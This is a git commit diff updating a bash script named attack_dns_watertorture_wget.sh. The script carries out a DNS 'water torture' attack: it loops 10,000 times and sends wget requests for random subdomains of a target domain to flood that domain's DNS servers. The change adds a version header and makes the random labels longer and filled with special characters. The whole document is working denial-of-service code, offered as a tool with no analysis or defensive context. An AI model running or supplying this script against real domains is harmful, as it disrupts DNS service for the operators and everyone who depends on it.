30cd7cb565c23861a448912e17657c4efef4d89f
Chris Gray <christophermjgray@gmail.com>
2020-02-25 22:40:24 -0500

    Update attack_dns_watertorture_wget.sh

--- attack_dns_watertorture_wget.sh
+++ attack_dns_watertorture_wget.sh
@@ -1,4 +1,8 @@
 #!/bin/bash
+# Christopher Gray
+# Update: 2/22/20
+# Version: 0.8.1
+#---------------------------------------
 # DNS WATER TORTURE with WGET
 
 if [ -z "$1" ]
@@ -12,6 +16,8 @@ fi
 
 for (( c=1; c<=10000; c++ ))
 do
-   wget -O /dev/null $RANDOM.$DomainName
+   #wget -O /dev/null $RANDOM.$DomainName
+   NEW_UUID_MORE_CHARACTERS=$(cat /dev/urandom | tr -dc "a-zA-Z0-9!@#$%^&*()_+?><~\`;'" | fold -w 32 | head -n 1)
+   echo $NEW_UUID_MORE_CHARACTERS.$DomainName
+   wget -O /dev/null $NEW_UUID_MORE_CHARACTERS.$DomainName
 done
-
